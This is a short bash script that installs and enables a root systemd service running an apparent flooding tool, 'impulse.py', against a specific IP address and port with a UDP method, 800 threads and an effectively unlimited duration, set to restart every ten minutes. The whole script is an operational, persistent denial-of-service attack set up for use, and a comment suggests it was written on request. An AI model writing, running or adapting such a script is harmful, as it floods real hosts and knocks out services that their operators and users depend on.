#!/bin/bash

cat <<EOF | sudo tee /etc/systemd/system/impulse3.service
[Unit]
Description=Impulse Service 2
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/Impulse
ExecStart=/usr/bin/python3 /root/Impulse/impulse.py --target 40.160.20.9:16262 --method UDP --time 99999999 --threads 800
Restart=always
# This forces the 10-minute cycle you asked for
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 5. Refresh Systemd and Start
sudo systemctl daemon-reload
sudo systemctl enable impulse3.service
sudo systemctl restart impulse3.service

# 6. Final Status Check
echo "------------------------------------------"
systemctl is-active --quiet impulse3.service && echo "SUCCESS: impulse3 is running." || echo "FAILED: Check journalctl -u impulse2"
